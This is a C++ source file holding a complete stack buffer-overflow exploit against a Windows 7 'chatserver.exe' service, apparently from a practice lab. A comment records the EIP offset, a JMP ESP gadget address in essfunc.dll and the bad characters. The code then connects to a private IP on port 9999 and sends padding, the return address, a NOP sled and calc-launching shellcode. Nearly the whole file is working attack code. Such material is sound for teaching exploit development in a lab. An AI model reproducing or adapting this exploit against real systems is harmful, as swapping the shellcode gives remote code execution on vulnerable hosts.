#include "C:\\BE\includes.h"

// Windows 7 - chatserver.exe

/*
	EIP offset:			48367648  ->	[*] Exact match at offset 6108

	JMP ESP:
		Address=		625014DF
		Message=		0x625014df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\elliot\Desktop\essfunc.dll)
						"\xdf\x14\x50\x62"		

	BadCharacters: "\x00"
*/

int main()
{
	Client c;
	c.Start("192.168.129.129", 9999);

	// Receive and print the first message from the server
	std::string temp = "";
	c.Recv(temp);
	std::cout << temp << "\n\n";

	// Generate A's
	int offset = 6108;
	std::string A = MultipleString("A", offset);

	// Generate nopsled
	std::string nops = MultipleString("\x90", 20);

	// Calculator Shellcode
	char calc_shellcode[] =
		"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
		"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
		"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
		"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
		"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
		"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7";

	// Generate padding
	std::string padding = MultipleString("D", 15000 - offset - 4 - nops.length() - (sizeof(calc_shellcode) / sizeof(calc_shellcode[0])));

	// The final exploit
	std::string exploit = A + "\xdf\x14\x50\x62" + nops + calc_shellcode + padding;

	// Sending the exploit
	c.Send(exploit);
	return 0;
}
